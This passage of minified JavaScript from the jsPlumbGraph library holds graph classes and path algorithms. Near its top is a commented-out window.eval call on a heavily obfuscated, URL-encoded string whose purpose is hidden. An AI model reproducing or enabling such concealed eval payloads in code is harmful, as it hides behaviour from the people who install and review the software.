    b.Selection.DISCARD_EXISTING = "discardExisting",
    b.Selection.DISCARD_NEW = "discardNew"
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbGraph = {};
    b.version = "0.1",
    b.name = "jsPlumbGraph";
    var c = function(a, b) {
        var c = {};
        this.setAttribute = function(a, b) {
            c[a] = b
        }
        ,
        this.getAttribute = function(a) {
            return c[a]
        }
        ;
        var d = b.getType(a || {});
        this.getType = function() {
            return d
        }
        ,
        this.setType = function(a) {
            d = a
        }
        ,
        this.graph = b
    }
      , d = function() {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(a) {
            var b = 16 * Math.random() | 0
              , c = "x" == a ? b : 3 & b | 8;
            return c.toString(16)
        })
    }
      , e = function(a, b, c) {
        if (null == a)
            return d();
        if ("string" == typeof a)
            return a;
        var e = b || c.getIdFunction();
        return e(a) || d()
    }
      , f = function(a) {
        return "string" == typeof a ? {
            id: a
        } : a
    }
      , g = b.Vertex = b.Node = function(a, d, g) {
        c.apply(this, [a, g]),
        this.objectType = "Node",
        this.id = e(a, d, g),
        this.data = f(a),
        this.getFullId = function() {
            return this.id
        }
        ;
        var i = []
          , j = 0
          , k = 0
          , l = []
          , m = []
          , n = {};
        this.getEdges = function(a) {
            if (null == a || null == a.filter)
                return i;
            for (var b = [], c = 0; c < i.length; c++)
                a.filter(i[c]) && b.push(i[c]);
            return b
        }
        ,
        this.getSourceEdges = function() {
            return this.getEdges({
                filter: function(a) {
                    return a.source == this
                }
                .bind(this)
            })
        }
        ,
        this.getTargetEdges = function() {
            return this.getEdges({
                filter: function(a) {
                    return a.target == this
                }
                .bind(this)
            })
        }
        ,
        this.addEdge = function(a) {
            i.push(a),
            a.source !== this && a.isDirected() || k++,
            a.target !== this && a.isDirected() || j++
        }
        ,
        this.deleteEdge = function(a) {
            for (var b = -1, c = 0; c < i.length; c++)
                if (i[c].getId() === a.getId()) {
                    b = c;
                    break
                }
            return b > -1 && (i.splice(b, 1),
            a.source !== this && a.isDirected() || k--,
            a.target !== this && a.isDirected() || j--,
            !0)
        }
        ,
        this.getAllEdges = function(a) {
            for (var b = this.getEdges(a).slice(0), c = 0; c < l.length; c++)
                b.push.apply(b, l[c].getEdges(a));
            return b
        }
        ,
        this.addGraph = function(a) {
            return a = "string" == typeof a ? new b.Graph({
                id: a
            }) : a,
            m.push(a),
            a.id || (a.id = "" + m.length),
            a
        }
        ,
        this.getGraph = function(a) {
            for (var b = 0; b < m.length; b++)
                if (m[b].id === a)
                    return m[b]
        }
        ,
        this.getIndegreeCentrality = function() {
            for (var a = 0, b = 0; b < l.length; b++)
                a += l[b].getIndegreeCentrality();
            return j + a
        }
        ,
        this.getOutdegreeCentrality = function() {
            for (var a = 0, b = 0; b < l.length; b++)
                a += l[b].getOutdegreeCentrality();
            return k + a
        }
        ,
        this.getPorts = function() {
            return l
        }
        ,
        this.addPort = function(a, b) {
            var c = e(a, b, g)
              , d = this.getPort(c);
            return null == d && (d = new h(a,b,this),
            l.push(d),
            n[d.id] = d),
            d
        }
        ,
        this.setPort = function(a, b) {
            var c = this.getPort(a);
            return c || (c = this.addPort({
                id: a
            })),
            c.data = b,
            c.setType(this.graph.getType(b)),
            c
        }
        ,
        this.getPort = function(a) {
            return n[a]
        }
        ;
        var o = function(a) {
            return a.constructor == b.Port ? a.id : a
        };
        this.removePort = function(a) {
            if (a) {
                for (var b = o(a), c = -1, d = !1, e = 0; e < l.length; e++)
                    if (l[e].id === b) {
                        c = e;
                        break
                    }
                if (c != -1) {
                    var f = l[c];
                    g.deleteVertex(f),
                    l.splice(c, 1),
                    d = !0
                }
                delete n[b]
            }
            return d
        }
        ;
        var p = 0
          , q = {};
        this.setDefaultInternalCost = function(a) {
            p = a
        }
        ,
        this.getInternalEdge = function(a, b) {
            var c = o(a)
              , d = o(b)
              , e = {
                source: n[c],
                target: n[d],
                cost: 1 / 0
            };
            if (e.source && e.target) {
                var f = q[c + "-" + d] || {
                    cost: p,
                    directed: !1
                };
                for (var g in f)
                    e[g] = f[g]
            }
            return e
        }
        ,
        this.setInternalEdge = function(a, b, c, d) {
            var e = o(a)
              , f = o(b);
            return q[e + "-" + f] = {
                cost: c || p,
                directed: d
            },
            this.getInternalEdge(a, b)
        }
        ,
        this.inspect = function() {
            for (var a = "{ id:" + this.id + ", edges:[\n", b = 0; b < i.length; b++)
                a += i[b].inspect() + "\n";
            return a += "]}"
        }
    }
      , h = b.Port = function(a, b, c) {
        g.apply(this, [a, b, c.graph]),
        this.objectType = "Port",
        this.getNode = function() {
            return c
        }
        ,
        this.getFullId = function() {
            return c.id + this.graph.getPortSeparator() + this.id
        }
        ,
        this.isChildOf = function(a) {
            return c == a
        }
        ,
        this.getPorts = this.addPort = this.deletePort = this.getPort = null
    }
      , i = b.Edge = function(a) {
        c.call(this, a.data, a.graph),
        this.source = a.source,
        this.target = a.target,
        this.objectType = "Edge";
        var b = a.cost || 1
          , d = !(a.directed === !1)
          , e = a.id
          , f = null;
        this.data = a.data || {},
        this.getCost = function() {
            return b
        }
        ,
        this.setCost = function(a) {
            b = a
        }
        ,
        this.getId = this.getFullId = function() {
            return null === e ? this.source.id + "_" + this.target.id : e
        }
        ,
        this.setId = function(a) {
            e = a
        }
        ,
        this.isDirected = function() {
            return d
        }
        ,
        this.setDirected = function(a) {
            d = a
        }
        ,
        this.inspect = function() {
            if (null != e)
                return "{ id:" + e + ", connectionId:" + f + ", cost:" + b + ", directed:" + d + ", source:" + this.source.id + ", target:" + this.target.id + "}"
        }
    }
      , j = b.Group = function(a, b, c) {
        g.apply(this, arguments),
        this.objectType = "Group";
        var d = []
          , e = {};
        this.addVertex = this.addNode = function(a) {
            return null == e[a.id] && (d.push(a),
            e[a.id] = a,
            a.group = this,
            !0)
        }
        ,
        this.getVertexCount = this.getNodeCount = function() {
            return d.length
        }
        ,
        this.getVertices = this.getNodes = function() {
            return d
        }
        ,
        this.deleteVertex = this.deleteNode = function(a) {
            if (a = "string" == typeof a ? e[a] : a) {
                var b = d.indexOf(a);
                b != -1 && (d.splice(b, 1),
                delete e[a.id]),
                delete a.group
            }
        }
        ,
        this.cleanup = function(a) {
            var b, e = this.getAllDirectEdges(), f = e.length;
            for (b = 0; b < f; b++)
                c.deleteEdge(e[0]);
            var g = d.length;
            for (b = 0; b < g; b++)
                a ? c.deleteVertex(d[0]) : delete d[0].group;
            d.length = 0
        }
        ,
        this.getAllDirectEdges = function(a) {
            var b, c = [];
            c.push.apply(c, this.getEdges(a).slice(0));
            var d = this.getPorts();
            for (b = 0; b < d.length; b++)
                c.push.apply(c, d[b].getEdges(a));
            return c
        }
        ,
        this.getAllEdges = function(a) {
            for (var b = [], c = {}, e = 0; e < d.length; e++)
                Array.prototype.push.apply(b, d[e].getAllEdges(a).filter(function(a) {
                    var b = a.getId()
                      , d = null == c[b];
                    return c[b] = !0,
                    d
                }));
            return b.push.apply(b, this.getAllDirectEdges(a)),
            b
        }
    }
      , k = b.Cluster = function(a) {
        this.vertices = [a],
        this.addVertex = function(a) {
            this.vertices.push(a)
        }
    }
      , l = (b.Graph = function(a) {
        a = a || {},
        this.vertices = [],
        this.edges = [],
        this.groups = [],
        this.id = a.id;
        var c = {}
          , d = 0
          , f = {}
          , h = 0
          , l = {}
          , m = 0
          , n = !(a.defaultDirected === !1)
          , q = a.defaultCost || 1
          , r = a.idFunction || function(a) {
            return a.id
        }
          , s = a.typeFunction || function(a) {
            return a.type || "default"
        }
          , t = a.enableSubgraphs === !0
          , u = a.portSeparator || "."
          , v = {}
          , w = function(a) {
            delete v[a.id]
        }
          , x = function(a) {
            v[a.id] = a
        }
          , y = function() {
            v = {}
        };
        this.setIdFunction = function(a) {
            r = a
        }
        ,
        this.getIdFunction = function() {
            return r
        }
        ,
        this.setTypeFunction = function(a) {
            s = a
        }
        ,
        this.getType = function(a) {
            return s(a)
        }
        ,
        this.getTopLevelElements = function() {
            return v
        }
        ,
        this.setEnableSubgraphs = function(a) {
            t = a
        }
        ,
        this.setPortSeparator = function(a) {
            u = a
        }
        ,
        this.getPortSeparator = function() {
            return u
        }
        ;
        var z = function(a, d) {
            if (null == a)
                return null;
            if ("string" != typeof a) {
                if (a.constructor == b.Port || a.constructor == b.Node || a.constructor == b.Group)
                    return a;
                var e = a;
                if (a = r(a),
                "string" != typeof a)
                    return e
            }
            var f = t ? a.split("/") : [a]
              , g = function(a) {
                if (c[a])
                    return c[a];
                if (l[a])
                    return l[a];
                var b = a.split(u)
                  , e = b[0]
                  , f = c[e] || l[e];
                if (2 === b.length && null != f) {
                    var g = f.getPort(b[1]);
                    return null == g && d && (g = f.addPort(b[1])),
                    g
                }
                return f
            };
            if (1 == f.length)
                return g(f[0]);
            if (f.length > 1 && f % 2 == 0)
                throw "Subgraph path format error.";
            for (var h = null, i = null, j = 0; j < f.length - 1; j += 2)
                h = g(f[j]),
                i = h.getGraph(f[j + 1]);
            return i.getVertex(f[f.length - 1])
        };
        this.clear = function() {
            this.vertices.length = 0,
            this.groups.length = 0,
            d = 0,
            h = 0,
            c = {},
            f = {},
            l = {},
            y()
        }
        ,
        this.getVertices = this.getNodes = function() {
            return this.vertices
        }
        ,
        this.getVertexCount = this.getNodeCount = function() {
            return this.vertices.length
        }
        ,
        this.getVertexAt = this.getNodeAt = function(a) {
            return this.vertices[a]
        }
        ,
        this.getEdgeCount = function() {
            return h
        }
        ,
        this.addEdge = function(a, b, c) {
            var d = null == a.directed ? n === !0 : !(a.directed === !1)
              , g = a.cost || q
              , j = e(a.data, b, this)
              , k = z(a.source, !0)
              , l = z(a.target, !0);
            if (null == k || null == k.objectType)
                throw new TypeError("Unknown source node [" + a.source + "]");
            if (null == l || null == l.objectType)
                throw new TypeError("Unknown target node [" + a.target + "]");
            if (c && !c(k, l))
                return null;
            var m = new i({
                source: k,
                target: l,
                cost: g,
                directed: d,
                data: a.data || {},
                id: j,
                graph: this
            });
            return m.source.addEdge(m),
            m.source !== m.target && m.target.addEdge(m),
            f[j] = m,
            h++,
            m
        }
        ,
        this.addVertex = this.addNode = function(a, b) {
            var e = new g(a,b || r,this);
            return c[e.id] ? null : (this.vertices.push(e),
            c[e.id] = e,
            e._id = d++,
            x(e),
            e)
        }
        ,
        this.addVertices = this.addNodes = function(a, b) {
            for (var c = 0; c < a.length; c++)
                this.addVertex(a[c], b || r)
        }
        ,
        this.addGroup = function(a, b) {
            var c = new j(a,b || r,this);
            return l[c.id] ? l[c.id] : (this.groups.push(c),
            l[c.id] = c,
            c._id = m++,
            x(c),
            c)
        }
        ,
        this.getGroupCount = function() {
            return this.groups.length
        }
        ,
        this.getGroupAt = function(a) {
            return this.groups[a]
        }
        ,
        this.addVertexToGroup = function(a, b) {
            b = "string" == typeof b ? l[b] : b,
            a = z(a),
            a && b && (b.addVertex(a),
            w(a))
        }
        ,
        this.addVerticesToGroup = function(a, b) {
            for (var c = 0; c < a.length; c++)
                this.addVertexToGroup(a[c], b)
        }
        ,
        this.deleteVertexFromGroup = function(a) {
            a = z(a),
            a && a.group && (a.group.deleteVertex(a),
            x(a))
        }
        ,
        this.deleteVerticesFromGroup = function(a, b) {
            for (var c = 0; c < a.length; c++)
                this.deleteVertexFromGroup(a[c], b)
        }
        ,
        this.deleteGroup = function(a, b) {
            if (a = "string" == typeof a ? l[a] : a) {
                a.cleanup(b),
                delete l[a.id];
                for (var c = -1, d = 0; d < this.groups.length; d++)
                    if (this.groups[d].id === a.id) {
                        c = d;
                        break
                    }
                return c > -1 && this.groups.splice(c, 1),
                w(a),
                a
            }
        }
        ,
        this.getGroup = function(a) {
            return "string" == typeof a ? l[a] : a
        }
        ,
        this.deleteVertex = this.deleteNode = function(a) {
            var b = z(a);
            if (b) {
                for (var e = -1, f = 0; f < this.vertices.length; f++)
                    if (this.vertices[f].id === b.id) {
                        e = f;
                        break
                    }
                e > -1 && (this.vertices.splice(e, 1),
                null != b.group && b.group.deleteVertex(b));
                for (var g = b.getEdges(), i = 0; i < g.length; i++)
                    this.deleteEdge(g[i]);
                if (h -= g.length,
                b.getPorts)
                    for (var j = b.getPorts(), k = 0; k < j.length; k++)
                        this.deleteVertex(j[k]);
                delete c[b.id],
                d--,
                w(b)
            }
        }
        ,
        this.deleteEdge = function(a) {
            if (a = this.getEdge(a),
            null != a) {
                var b = z(a.source);
                b && b.deleteEdge(a) && h--;
                var c = z(a.target);
                c && c.deleteEdge(a),
                delete f[a.getId()]
            }
        }
        ,
        this.getEdge = function(a) {
            if (null != a) {
                if ("string" != typeof a) {
                    if (a.constructor == b.Edge)
                        return a;
                    var c = a;
                    if (a = r(a),
                    "string" != typeof a)
                        return c
                }
                return f[a]
            }
        }
        ,
        this.getEdges = function(a) {
            a = a || {};
            var b, c = a.source, d = a.target, e = a.filter || function() {
                return !0
            }
            , g = function(a) {
                return !(null != c && a.source == j !== c || null != d && a.target == j !== d)
            }, h = [], i = function(a) {
                e(a) && g(a) && h.push(a)
            };
            if (a.node) {
                var j = z(a.node)
                  , k = j.getAllEdges();
                for (b = 0; b < k.length; b++)
                    i(k[b])
            } else
                for (b in f)
                    i(f[b]);
            return h
        }
        ,
        this.getAllEdges = function() {
            var a = [];
            for (var b in f)
                a.push(f[b]);
            return a
        }
        ,
        this.findPath = function(a, b, c, d, e) {
            return a = z(a),
            b = z(b),
            p.compute({
                graph: this,
                source: a,
                target: b,
                strict: !(c === !1),
                nodeFilter: d,
                edgeFilter: e
            })
        }
        ,
        this.getDistance = function(a, b, c) {
            var d = this.findPath(a, b, c);
            return d.pathDistance
        }
        ,
        this.getVertex = this.getNode = z,
        this.setTarget = function(a, b) {
            if (b = z(b),
            null == b)
                return {
                    success: !1
                };
            var c = a.target;
            return a.target.deleteEdge(a),
            a.target = b,
            b.addEdge(a),
            {
                old: c,
                edge: a,
                new: b,
                success: !0
            }
        }
        ,
        this.setSource = function(a, b) {
            if (b = z(b),
            null == b)
                return {
                    success: !1
                };
            var c = a.source;
            return a.source.deleteEdge(a),
            a.source = b,
            b.addEdge(a),
            {
                old: c,
                edge: a,
                new: b,
                success: !0
            }
        }
        ,
        this.printPath = function(a, b) {
            a = z(a),
            b = z(b);
            for (var c = this.findPath(a, b).path, d = "[" + a.id + " - " + b.id + "] : ", e = 0; e < c.length; e++)
                d = d + "{ vertex:" + c[e].vertex.id + ", cost:" + c[e].cost + ", edge: " + (c[e].edge && c[e].edge.getId()) + " } ";
            return d
        }
        ,
        this.getDiameter = function(a) {
            for (var b = 0, c = 0; c < this.vertices.length; c++)
                for (var d = 0; d < this.vertices.length; d++)
                    if (d != c) {
                        var e = p.compute({
                            graph: this,
                            source: this.vertices[c],
                            target: this.vertices[d]
                        });
                        if (null == e.path || 0 == e.path.length) {
                            if (!a)
                                return 1 / 0
                        } else
                            b = Math.max(b, e.pathDistance)
                    }
            return b
        }
        ,
        this.diameter = this.getDiameter,
        this.getCentrality = function(a) {
            return a = z(a),
            (a.getIndegreeCentrality() + a.getOutdegreeCentrality()) / (this.getVertexCount() - 1)
        }
        ,
        this.getDegreeCentrality = this.getCentrality,
        this.getIndegreeCentrality = function(a) {
            return a = z(a),
            a.getIndegreeCentrality() / (this.getVertexCount() - 1)
        }
        ,
        this.getOutdegreeCentrality = function(a) {
            return a = z(a),
            a.getOutdegreeCentrality() / (this.getVertexCount() - 1)
        }
        ,
        this.getCloseness = function(a) {
            return 1 / this.getFarness(a)
        }
        ,
        this.getFarness = function(a) {
            a = z(a);
            var b = p.compute({
                graph: this,
                source: a,
                target: a,
                processAll: !0
            })
              , c = 0;
            for (var d in b.dist)
                c += b.dist[d];
            return c / (this.getVertexCount() - 1)
        }
        ,
        this.getBetweenness = function(a) {
            var b = this.getVertexCount()
              , c = (b - 1) * (b - 2) / 2
              , d = 0
              , e = 0
              , f = function(a, b, c, d, e) {
                var g = c.parents[a][b];
                if (0 == g.length) {
                    var h = d.slice();
                    h.unshift(a),
                    e.push(h)
                } else
                    for (var i = 0; i < g.length; i++)
                        if (d.indexOf(g[i][0].id) == -1) {
                            var h = d.slice();
                            h.unshift(g[i][0].id),
                            f(a, g[i][0].id, c, h, e)
                        }
            };
            a = z(a);
            var g = o.compute({
                graph: this,
                focus: a
            });
            for (var h in g.paths)
                for (var i in g.paths[h])
                    if (h != i) {
                        var j = []
                          , k = 0;
                        f(h, i, g, [i], j);
                        for (var l = 0; l < j.length; l++) {
                            var m = j[l].indexOf(a.id);
                            m > 0 && m < j[l].length - 1 && k++
                        }
                        d += k / j.length,
                        e += k
                    }
            return d / c
        }
        ,
        this.inspect = function() {
            for (var a = "", b = 0; b < this.vertices.length; b++)
                a += this.vertices[b].inspect() + "\n";
            return a
        }
        ,
        this.serialize = function() {
            for (var a, b, c, d, e = {
                nodes: [],
                edges: [],
                ports: [],
                groups: []
            }, f = 0; f < this.vertices.length; f++) {
                a = this.vertices[f],
                e.nodes.push(a.data),
                b = a.getAllEdges(),
                c = a.getPorts();
                for (var g = 0; g < b.length; g++)
                    if (b[g].source == a || "Port" === b[g].source.objectType && b[g].source.getNode() == a) {
                        var h = {
                            source: b[g].source.getFullId(),
                            target: b[g].target.getFullId()
                        };
                        b[g].data && (h.data = b[g].data),
                        e.edges.push(h)
                    }
                for (var i = 0; i < c.length; i++) {
                    var j = {};
                    for (var k in c[i].data)
                        j[k] = c[i].data[k];
                    j.id = c[i].getFullId(),
                    e.ports.push(j)
                }
            }
            for (f = 0; f < this.groups.length; f++) {
                d = this.groups[f],
                e.groups.push(d.data),
                b = d.getEdges();
                for (var g = 0; g < b.length; g++)
                    if (b[g].source === d) {
                        var h = {
                            source: d.getFullId(),
                            target: b[g].target.getFullId()
                        };
                        b[g].data && (h.data = b[g].data),
                        e.edges.push(h)
                    }
            }
            return e
        }
        ,
        this.getClusters = function() {
            var a, b = [], c = {}, d = function(a, e) {
                if (null != a && !c[a.id]) {
                    null == e ? (e = new k(a),
                    b.push(e)) : e.addVertex(a),
                    c[a.id] = !0;
                    for (var f = a.getAllEdges(), g = 0; g < f.length; g++) {
                        var h = f[g].source === a ? f[g].target : f[g].source;
                        d(h, e)
                    }
                }
            };
            for (a = 0; a < this.vertices.length; a++)
                d(this.vertices[a]);
            for (a = 0; a < this.groups.length; a++)
                d(this.groups[a]);
            return b
        }
    }
    ,
    function(a, b, c, d, e) {
        for (var f = -1, g = null, h = 1 / 0, i = 0; i < a.length; i++)
            if (!b[i]) {
                var j = e(a[i]);
                j < h && (h = j,
                f = i,
                g = a[i])
            }
        return {
            node: g,
            index: f
        }
    }
    )
      , m = function(a, b) {
        var c = b.getFullId()
          , d = a[c];
        return null == d && (c = b.getNode ? b.getNode().id : b.id,
        d = a[c]),
        null == d ? null : {
            p: d,
            id: c
        }
    }
      , n = function(a, b, c, d, e, f) {
        for (var g = [], h = d, i = m(b, h); null != i; )
            g.splice(0, 0, {
                vertex: h,
                cost: a[i.id],
                edge: c[i.id]
            }),
            h = i.p,
            i = m(b, h);
        return g.splice(0, 0, {
            vertex: h,
            cost: 0,
            edge: null
        }),
        g
    }
      , o = {
        getPath: function(a, b, c, d) {
            if (a[c.id][d.id] == 1 / 0)
                return null;
            var e = b[c.id][d.id];
            return null == e ? " " : o.getPath(a, b, c, e) + " " + e.id + " " + o.getPath(a, b, e, d)
        },
        getPaths: function(a, b, c, d, e) {
            if (a[c.id][d.id] == 1 / 0)
                return null;
            var f = b[c.id][d.id];
            return 0 == f.length ? " " : o.getPaths(a, b, c, f[0]) + " " + f[0].id + " " + o.getPaths(a, b, f[0], d)
        },
        compute: function(a) {
            var b, c, d, e = a.graph, f = e.getVertexCount(), g = {}, h = {};
            for (b = 0; b < f; b++) {
                var i = e.getVertexAt(b);
                for (g[i.id] || (g[i.id] = {}),
                h[i.id] || (h[i.id] = {}),
                g[i.id][i.id] = 0,
                c = 0; c < f; c++)
                    if (b != c) {
                        var j = e.getVertexAt(c);
                        g[i.id][j.id] || (g[i.id][j.id] = 1 / 0),
                        h[i.id][j.id] || (h[i.id][j.id] = [])
                    }
                var k = i.getEdges();
                for (d = 0; d < k.length; d++)
                    k[d].source == i ? g[i.id][k[d].target.id] = k[d].getCost() : (g[k[d].source.id] || (g[k[d].source.id] = {},
                    h[k[d].source.id] = {}),
                    g[i.id][k[d].source.id] = k[d].getCost())
            }
            for (d = 0; d < f; d++)
                for (b = 0; b < f; b++)
                    for (c = 0; c < f; c++)
                        if (b != c && c != d && b != d) {
                            var l = e.getVertexAt(b).id
                              , m = e.getVertexAt(c).id
                              , n = e.getVertexAt(d).id;
                            g[l][n] + g[n][m] <= g[l][m] && g[l][n] + g[n][m] != 1 / 0 && (g[l][m] = g[l][n] + g[n][m],
                            h[l][m] || (h[l][m] = []),
                            h[l][m].unshift([e.getVertexAt(d), g[l][m]]))
                        }
            return {
                paths: g,
                parents: h
            }
        }
    }
      , p = {
        compute: function(a) {
            for (var b = a.graph, c = a.source, d = a.target, e = a.nodeFilter, f = a.edgeFilter, g = {}, h = {}, i = {}, j = {
                dist: g,
                previous: h,
                edges: i,
                path: []
            }, k = a.processAll, m = {}, o = {}, p = !(a.strict === !1), q = function(a) {
                return a.getFullId ? a.getFullId() : a.id
            }, r = [], s = function(a) {
                var b = o[a.getFullId()];
                return m[b.v.id]
            }, t = function(a, b) {
                var c, d;
                if ("Port" === a.objectType) {
                    for (g[a.getFullId()] = b,
                    c = s(a),
                    d = 0; d < c.length; d++)
                        c[d].p != a && (g[c[d].p.getFullId()] = b + a.getNode().getInternalEdge(a, c[d].p).cost);
                    p || (g[a.getNode().id] = b)
                } else
                    for (g[a.id] = b,
                    c = m[a.id],
                    d = 0; d < c.length; d++)
                        g[c[d].p.getFullId()] = b
            }, u = function(a) {
                return e && !e(a) ? 1 / 0 : g[q(a)]
            }, v = function(a, b, c) {
                if ("Port" === a.objectType) {
                    for (var d = s(a), e = 0; e < d.length; e++)
                        h[d[e].p.getFullId()] = c.node;
                    p || (h[a.getNode().id] = c.node)
                }
                h[b] = c.node
            }, w = function(a, b, c) {
                if ("Port" === a.objectType) {
                    for (var d = s(a), e = 0; e < d.length; e++)
                        i[d[e].p.getFullId()] = c;
                    p || (i[a.getNode().id] = c)
                }
                i[b] = c
            }, x = 0; x < b.vertices.length; x++) {
                var y = b.vertices[x]
                  , z = y.getPorts();
                r.push(y);
                var A = {
                    v: y,
                    i: r.length - 1
                };
                m[y.id] = [],
                t(y, 1 / 0);
                for (var B = 0; B < z.length; B++)
                    r.push(z[B]),
                    o[z[B].getFullId()] = A,
                    m[y.id].push({
                        p: z[B],
                        i: r.length - 1
                    }),
                    t(z[B], 1 / 0)
            }
            if (null == c && (c = b.getVertex(a.sourceId)),
            null == d && (d = b.getVertex(a.targetId)),
            null == c || null == d)
                return j;
            var C = c
              , D = d;
            c.getNode && (C = c.getNode()),
            d.getNode && (D = d.getNode()),
            t(c, 0);
            for (var E = new Array(b.vertices.length), F = 0, G = function(a, b, c, d) {
                for (var e = 0; e < b.length; e++) {
                    var f = b[e];
                    if (c(f)) {
                        var g = d(f)
                          , h = g.tp || g.tn
                          , i = q(h)
                          , j = u(a.node) + f.getCost()
                          , k = u(h);
                        j < k && (t(h, j),
                        v(h, i, a),
                        w(h, i, f))
                    }
                }
            }; F < r.length; ) {
                var H = l(r, E, g, q, u)
                  , I = H.node ? q(H.node) : null;
                if (!H.node || u(H.node) == 1 / 0)
                    break;
                if (d && (I == q(d) || !p && H.node.isChildOf && H.node.isChildOf(d)) && (j.path = n(g, h, i, d, q),
                j.pathDistance = j.path[j.path.length - 1].cost,
                !k))
                    break;
                E[H.index] = !0,
